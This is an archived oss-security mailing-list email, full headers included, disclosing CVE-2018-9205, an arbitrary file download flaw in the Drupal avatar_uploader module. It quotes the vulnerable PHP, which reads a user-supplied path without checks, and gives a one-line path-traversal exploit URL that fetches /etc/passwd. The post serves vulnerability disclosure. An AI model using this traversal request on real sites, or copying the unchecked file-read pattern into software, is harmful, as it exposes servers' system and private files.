X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1103" "Thursday" "12" "April" "2018" "08:28:15" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<3B4F690F-2918-4282-BEBE-E163F07D205F@me.com>" "29" "[oss-security] Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8" nil nil nil "4" "2018041212:28:15" "[oss-security] Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8" (number mark "U       larry0@me.co Apr 12   29/1103  " thread-indent "\"[oss-security] Arbitrary file download vulnerability in Drupal module avatar_uploader v7.x-1.0-beta8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3693 invoked by uid 550); 12 Apr 2018 12:28:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3663 invoked from network); 12 Apr 2018 12:28:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1523536099; bh=O4RVXIh8naRTindWCqRqtvXf8YyxMeZhntNMjBKv/Ew=;
	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
	b=3OJFo7SmxCFj96kRvvcg6e50X8wKYkyUPEZFX36qpKNK28yXvh+l4/XdiGp1rCZ9R
 AZlL+bt2xXIDpMvIfBKvNt1CVXC7Qp1YFIEovj++uppVYLSlQ9J9bg0Fvh6OwtXY+I
 Q3Clw168GP72+P4Euzhz5Ic5snSdPcB17bfvD02momE2ZyzJZLfsWXOjnS58GeC3Iv
 IubzAYv0dpgdhBhsqClZembrN+mT1BEoL6qEIE9N7y2p3/r2+wIzOGtvIH0jOnLlPt
 7Cqlu/GUFbKI9qYcuKt2NIIC2Q4WwFXfrostQCGmGCDDRHAFLIsjkNXO+EmEWAfNGA
 f76966FmMpCXw==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2018-04-12_07:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1804120125
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
Message-id: <3B4F690F-2918-4282-BEBE-E163F07D205F@me.com>
Date: Thu, 12 Apr 2018 08:28:15 -0400
To: Open Source Security <oss-security@lists.openwall.com>
X-Mailer: Apple Mail (2.3273)
Subject: [oss-security] Arbitrary file download vulnerability in Drupal module avatar_uploader
 v7.x-1.0-beta8

Title: Arbitrary file download vulnerability in Drupal module avatar_upload=
er v7.x-1.0-beta8
Author: Larry W. Cashdollar
Date: 2018-03-30
CVE-ID:[CVE-2018-9205]
Download Site: https://www.drupal.org/project/avatar_uploader
Vendor: https://www.drupal.org/u/robbinzhao
Vendor Notified: 2018-04-02
Vendor Contact: https://www.drupal.org/project/avatar_uploader/issues/29579=
66#comment-12554146
Advisory: http://www.vapidlabs.com/advisory.php?v=3D202
Description: This module used Simple Ajax Uploader, and provide a basic upl=
oader panel, for more effect, you can do your custom javascript. Such as, u=
sers' mouse hover on avatar, the edit link will slideup, or others.
Vulnerability:
The view.php contains code to retrieve files but no code to verify a user s=
hould be able to view files or keep them from changing the path to outside =
of the uploadDir directory:

<?php

$file =3D $_GET['file'];

echo file_get_contents("uploadDir/$file");
exit;

Exploit Code:
	=E2=80=A2 http://example.com/sites/all/modules/avatar_uploader/lib/demo/vi=
ew.php?file=3D../../../../../../../../../../../etc/passwd=
